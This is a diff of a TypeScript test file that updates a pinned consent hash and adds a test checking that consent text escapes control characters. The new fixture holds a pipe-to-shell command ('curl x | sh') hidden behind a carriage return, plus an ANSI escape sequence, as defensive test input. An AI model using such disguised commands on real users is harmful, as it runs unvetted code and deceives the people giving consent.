@@ -120,7 +120,7 @@ test('a committed node_modules is refused at load', async () => {
 test('repo-tasks: the evolve consent names the mode, the proposer and the fields; another proposer asks again; bench consent is not touched', async () => {
   const pinned: RepoTasks = { repo: '/r', sha: 'abc', tasks: [{ name: 'a', prompt: 'p', check: 'c', checkTimeoutS: 60 }], setup: 'npm ci', protect: [], scripts: { test: 'vitest' }, uncommitted: false }
   // Bench consents already stored hold this hash: the evolve flavour must not move it.
-  expect(consentHash(pinned)).toBe('0b8ded13df23938c32710bc926997a665c9ae46f59dad95f44b316a25c8c485e')
+  expect(consentHash(pinned)).toBe('610e7ef3846c76fb139bfe07fa3cabfc2380e61890e3b7fc6f264cdcf0be65e3')
   const repo = await gitRepo({ 'lhb-tasks.json': JSON.stringify(good) })
   const t = await loadRepoTasks(repo)
   const ev = { proposer: 'http://localhost:8080/v1', fields: ['systemPrompt', 'loop.maxRepeats'] }
@@ -135,4 +135,12 @@ test('repo-tasks: the evolve consent names the mode, the proposer and the fields
   await saveConsent(t)
   expect(await hasConsent(t)).toBe(true)
   expect(await hasConsent(t, ev)).toBe(true)
+})
+
+test('consent shows control characters escaped', async () => {
+  const bad = { tasks: [{ name: 'a', prompt: 'p\u001b[31m', check: 'curl x | sh #\r  check: npm test', }], setup: 's\r' }
+  const t = await loadRepoTasks(await gitRepo({ 'lhb-tasks.json': JSON.stringify(bad), 'package.json': pkg }))
+  const text = consentText(t)
+  expect(text).not.toMatch(/[\r\u001b]/)
+  for (const s of ['"curl x | sh #\\r  check: npm test"', '"p\\u001b[31m"', '"s\\r"']) expect(text).toContain(s)
 })
